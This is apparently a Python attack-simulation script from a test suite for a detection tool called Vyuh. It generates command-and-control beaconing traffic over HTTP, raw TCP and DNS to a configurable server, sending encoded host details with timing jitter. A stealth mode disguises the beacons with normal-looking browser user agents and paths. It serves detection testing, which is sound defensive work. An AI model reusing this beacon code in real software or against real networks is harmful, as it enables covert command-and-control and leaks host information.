"""
04_c2_beaconing.py — C2 Command & Control Beaconing Simulation
==============================================================
Simulates malware beaconing behavior: periodic HTTP/HTTPS check-ins
to a Command & Control server at regular intervals with configurable
jitter, user-agent rotation, and encoded payloads.

Vyuh should detect:
  - Periodic / regular-interval outbound connections
  - Low-variation inter-beacon timing (beaconing pattern)
  - Suspicious User-Agent strings
  - Connections to uncommon ports

Usage:
    python 04_c2_beaconing.py
    python 04_c2_beaconing.py --server 192.168.1.200 --port 8080 --interval 30 --count 10
    python 04_c2_beaconing.py --protocol tcp --stealth
"""

import socket
import time
import argparse
import logging
import random
import json
import base64
import struct
import threading
import urllib.request
import urllib.error
from datetime import datetime
import sys
import os

sys.path.insert(0, os.path.dirname(__file__))
import config

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(config.LOG_FILE, mode="a"),
    ]
)
log = logging.getLogger("c2_beaconing")

BANNER = """
╔══════════════════════════════════════════════════╗
║    Vyuh Attack Sim — 04 C2 BEACONING             ║
╚══════════════════════════════════════════════════╝
"""

# ── Malware-like User Agents ──────────────────────────────────────────────────
SUSPICIOUS_USER_AGENTS = [
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",  # Old IE
    "curl/7.68.0",
    "python-requests/2.18.4",
    "Go-http-client/1.1",
    "Java/1.8.0_202",
    "Wget/1.20.3",
    "libwww-perl/6.43",
    "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
]

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]


# ── Beacon Payload Builder ────────────────────────────────────────────────────
def build_beacon_payload(beacon_id: int, hostname: str) -> dict:
    """Build a realistic C2 beacon payload (what malware sends on check-in)."""
    return {
        "id":       beacon_id,
        "host":     hostname,
        "os":       "Windows 10",
        "arch":     "x64",
        "pid":      random.randint(1000, 9999),
        "username": random.choice(["admin", "user", "svc_acct", "SYSTEM"]),
        "ts":       datetime.utcnow().isoformat(),
        "uptime":   random.randint(3600, 86400),
        "interval": config.C2_BEACON_INTERVAL,
    }


def encode_payload(payload: dict) -> str:
    """Encode payload as base64 JSON (like real implants do)."""
    raw = json.dumps(payload).encode()
    return base64.b64encode(raw).decode()


# ── HTTP Beacon ───────────────────────────────────────────────────────────────
def http_beacon(server: str, port: int, beacon_num: int,
                stealth: bool = False) -> tuple[bool, str]:
    """
    Send an HTTP GET/POST beacon to the C2 server.
    Stealth mode uses normal-looking User-Agents and paths.
    """
    hostname  = socket.gethostname()
    payload   = build_beacon_payload(beacon_num, hostname)
    encoded   = encode_payload(payload)

    # Stealth: use innocuous-looking URLs; non-stealth: obvious C2 patterns
    if stealth:
        paths = ["/update", "/check", "/status", "/api/v1/ping",
                 "/cdn/assets/img.png", "/static/js/main.js"]
        ua    = random.choice(NORMAL_USER_AGENTS)
    else:
        paths = ["/beacon", "/c2/check", "/cmd", "/implant/beacon",
                 "/api/beacon", "/checkin"]
        ua    = random.choice(SUSPICIOUS_USER_AGENTS)

    path = random.choice(paths)
    url  = f"http://{server}:{port}{path}?id={encoded[:20]}"

    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", ua)
        req.add_header("X-Beacon-Id", str(beacon_num))
        req.add_header("X-Session", encoded[:32])
        req.add_header("Content-Type", "application/json")

        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read(512)
            return True, f"HTTP {resp.status} — {len(body)}B response"
    except urllib.error.URLError as e:
        # Connection refused is expected if no listener — still generates traffic
        if "Connection refused" in str(e) or "timed out" in str(e).lower():
            return True, f"conn_refused (traffic generated)"
        return False, str(e)
    except Exception as e:
        return False, str(e)


# ── Raw TCP Beacon ────────────────────────────────────────────────────────────
def tcp_beacon(server: str, port: int, beacon_num: int) -> tuple[bool, str]:
    """
    Raw TCP socket beacon — mimics custom C2 protocols (Cobalt Strike, Metasploit).
    Sends a structured binary beacon frame.
    """
    hostname  = socket.gethostname()
    payload   = build_beacon_payload(beacon_num, hostname)
    data      = json.dumps(payload).encode()

    # Frame: magic(4) + beacon_id(4) + length(4) + data
    magic  = b"\xDE\xAD\xBE\xEF"
    frame  = magic + struct.pack(">II", beacon_num, len(data)) + data

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((server, port))
            s.sendall(frame)
            try:
                resp = s.recv(1024)
                return True, f"TCP response: {len(resp)}B"
            except socket.timeout:
                return True, "TCP connected, no response (expected)"
    except ConnectionRefusedError:
        return True, "TCP conn_refused (traffic generated)"
    except Exception as e:
        return False, str(e)


# ── DNS Beacon ────────────────────────────────────────────────────────────────
def dns_beacon(dns_server: str, dns_port: int,
               beacon_num: int, domain: str) -> tuple[bool, str]:
    """
    DNS-based C2 beacon — resolves a beacon-encoded hostname.
    Used by malware to communicate through DNS when HTTP is blocked.
    """
    encoded = base64.b32encode(
        f"b{beacon_num:04d}".encode()
    ).decode().lower().rstrip("=")

    fqdn = f"{encoded}.{domain}"
    try:
        packet = build_dns_query_minimal(fqdn)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(3)
            s.sendto(packet, (dns_server, dns_port))
            try:
                resp = s.recv(512)
                return True, f"DNS response: {len(resp)}B"
            except socket.timeout:
                return True, "DNS no response (traffic generated)"
    except Exception as e:
        return False, str(e)


def build_dns_query_minimal(fqdn: str) -> bytes:
    """Minimal DNS query packet builder (reused from dns_tunneling)."""
    import struct
    transaction_id = random.randint(0, 65535)
    header = struct.pack(">HHHHHH", transaction_id, 0x0100, 1, 0, 0, 0)
    question = b""
    for part in fqdn.split("."):
        enc = part.encode("ascii")
        question += bytes([len(enc)]) + enc
    question += b"\x00"
    question += struct.pack(">HH", 1, 1)
    return header + question


# ── Beacon Loop ───────────────────────────────────────────────────────────────
def run_beacon_loop(server: str, port: int, dns_server: str,
                     protocol: str, interval: float, jitter: float,
                     count: int, stealth: bool):
    """
    Main beacon loop — sends periodic beacons with random jitter.
    Jitter prevents exact-interval detection (but pattern still visible).
    """
    log.info(f"=== C2 Beaconing started | server={server}:{port} | "
             f"protocol={protocol} | interval={interval}s | jitter=±{jitter}s ===")

    print(f"\n  {'#':<4} {'TIME':<20} {'PROTOCOL':<8} {'STATUS':<30} {'NEXT IN'}")
    print(f"  {'-'*4} {'-'*20} {'-'*8} {'-'*30} {'-'*8}")

    beacon_num = 0
    beacon_times = []

    while count == 0 or beacon_num < count:
        beacon_num += 1
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        beacon_times.append(time.time())

        # Send beacon based on protocol
        if protocol == "http":
            ok, status = http_beacon(server, port, beacon_num, stealth)
        elif protocol == "tcp":
            ok, status = tcp_beacon(server, port, beacon_num)
        elif protocol == "dns":
            ok, status = dns_beacon(dns_server, config.DNS_PORT,
                                     beacon_num, config.DNS_DOMAIN)
        else:
            # Multi-protocol rotation (harder to detect)
            proto_choice = random.choice(["http", "tcp", "dns"])
            if proto_choice == "http":
                ok, status = http_beacon(server, port, beacon_num, stealth)
                protocol_label = "HTTP"
            elif proto_choice == "tcp":
                ok, status = tcp_beacon(server, port, beacon_num)
                protocol_label = "TCP"
            else:
                ok, status = dns_beacon(dns_server, config.DNS_PORT,
                                         beacon_num, config.DNS_DOMAIN)
                protocol_label = "DNS"
            protocol = "multi"  # keep label consistent

        icon    = "✅" if ok else "❌"
        proto_l = protocol.upper()
        next_in = interval + random.uniform(-jitter, jitter)
        next_in = max(next_in, 1.0)

        log.info(f"Beacon [{beacon_num}] {proto_l}: {icon} {status}")
        print(f"  {beacon_num:<4} {ts:<20} {proto_l:<8} {icon} {status:<28} {next_in:.1f}s")

        if count > 0 and beacon_num >= count:
            break

        time.sleep(next_in)

    # Stats
    if len(beacon_times) > 1:
        intervals = [beacon_times[i+1] - beacon_times[i]
                     for i in range(len(beacon_times) - 1)]
        avg_interval = sum(intervals) / len(intervals)
        print(f"\n  Average beacon interval: {avg_interval:.2f}s "
              f"(Vyuh analyzes this for beaconing patterns)")

    print("\n" + "═" * 52)
    print(f"  C2 BEACONING COMPLETE")
    print(f"  Beacons sent : {beacon_num}")
    print("═" * 52)
    log.info(f"C2 beaconing complete: {beacon_num} beacons sent")


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="C2 Beaconing Simulation — Vyuh")
    parser.add_argument("--server",   default=config.C2_SERVER,           help="C2 server IP")
    parser.add_argument("--port",     default=config.C2_HTTP_PORT, type=int, help="C2 HTTP port")
    parser.add_argument("--dns",      default=config.DNS_SERVER,          help="DNS server for DNS beacons")
    parser.add_argument("--protocol", default="http",
                        choices=["http", "tcp", "dns", "multi"],          help="Beacon protocol")
    parser.add_argument("--interval", default=config.C2_BEACON_INTERVAL, type=float,
                                                                          help="Beacon interval (s)")
    parser.add_argument("--jitter",   default=config.C2_JITTER, type=float, help="Jitter ±seconds")
    parser.add_argument("--count",    default=config.C2_BEACON_COUNT, type=int,
                                                                          help="Beacon count (0=infinite)")
    parser.add_argument("--stealth",  action="store_true",                help="Use stealth UA/paths")
    args = parser.parse_args()

    print(f"  C2 Server  : {args.server}:{args.port}")
    print(f"  Protocol   : {args.protocol.upper()}")
    print(f"  Interval   : {args.interval}s ± {args.jitter}s jitter")
    print(f"  Count      : {args.count if args.count > 0 else 'infinite'}")
    print(f"  Stealth    : {'Yes' if args.stealth else 'No'}")

    run_beacon_loop(
        server     = args.server,
        port       = args.port,
        dns_server = args.dns,
        protocol   = args.protocol,
        interval   = args.interval,
        jitter     = args.jitter,
        count      = args.count,
        stealth    = args.stealth,
    )


if __name__ == "__main__":
    main()
